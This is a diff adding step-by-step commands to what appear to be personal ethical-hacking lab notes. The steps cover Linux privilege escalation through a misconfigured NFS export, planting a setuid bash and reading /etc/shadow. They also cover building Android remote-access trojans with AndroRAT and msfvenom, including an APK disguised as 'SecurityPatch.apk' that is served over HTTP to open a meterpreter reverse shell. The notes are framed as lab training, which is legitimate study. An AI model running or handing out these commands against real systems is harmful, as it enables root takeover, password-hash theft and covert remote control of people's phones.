@@ -202,6 +202,39 @@ Thus we escalate from normal/attacker user to root user
 Escalate privileges in linux using misconfigured NFS-
 NFS is a Network File System is a protocol enables users to access files remotely thru a network.
 PDF Downloaded
+Vicitm Machine-
+-sudo apt update
+-sudo apt install nfs-kernel-server
+-nano /etc/exports
+-/home *(rw, no_root_squash)
+-sudo /etc/init.d/nfs-kernel-server restart
+
+Attacker Machine-
+-nmap -sV --script=nfs-showmount 192.168.1.102
+-We can see 2049 port nfs is open
+
+Manual NFS Enumeration - 
+sudo apt-get install nfs-common
+showmount -e 192.168.1.102
+
+mkdir /tmp/nfs/
+sudo mount -t nfs 10.10.1.9:/home/tmp/nfs
+cd tmp/nfs
+sudo cp /bin/bash .
+sudo chmod +s bash
+ls -la
+sudo df -h (Check for free disk space)
+
+ssh ubuntu@10.10.1.9
+Enter
+whoami
+
+cd /home
+ls -la
+./bash -p
+whoami
+nano /etc/shadow = To Check for hashes of all accounts
+
 
 Covert TCP-
 It is used to send the one byte at a time from any host to destination.
@@ -513,18 +546,26 @@ You can upoad files into s3 buckets
 
 Escalating IAM user privileges using misconfigured user policy
 
-Hacking Android Device using apk file created using AndroRAT
+Hacking Android Device using apk file created using AndroRAT-
+sudo su
 cd AndroRAT
 python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityPatch.apk
-i=local Ip address
+i=Parrot sec Ip address
+{
+ls
+python3 -m http.server 8888
+}
+OR
+{
 cp /home/attacker/AndroRAT/SecurityPatch.apk /var/www/html/share
 If not copied to apache server then try -
 mkdir /var/www/html/share
 chmod -R 755 /var/www/html/share
 chown -R www-data:www-data /var/www/html/share
 service apache2 start
+}
 python3 androRAT.py --shell -i 0.0.0.0 -p 4444
-Open android and search http://10.10.1.13/share
+Open android and search http://10.10.1.13/share or 8888
 Download and install apk
 We can see meterpreter session gets created
 >help
@@ -533,15 +574,22 @@ We can see meterpreter session gets created
 >getMACAddress
 
 Hacking android device by creating binary payloads using Parrotsec-
-msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > /var/www/html/share/Backdoor.apk
+msfvenom -l payloads | grep android
+msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 LPORT=4444 -f raw -o Backdoor.apk
 LHOST=Parrotsec IP
-Download Backdoor.apk and install
+ls
+cp Backdoor.apk Downloads/Backdoor.apk
+cd Downloads
+ls
+python3 -m http.server 8000
 
+New tab-
 msfconsole
 use exploit/multi/handler
 set payload android/meterpreter/reverse_tcp
 set LHOST 10.10.1.13
-exploit -j -z
+options
+exploit
 
 We can see after installing Backdoor a shell gets created
 >session -i 1
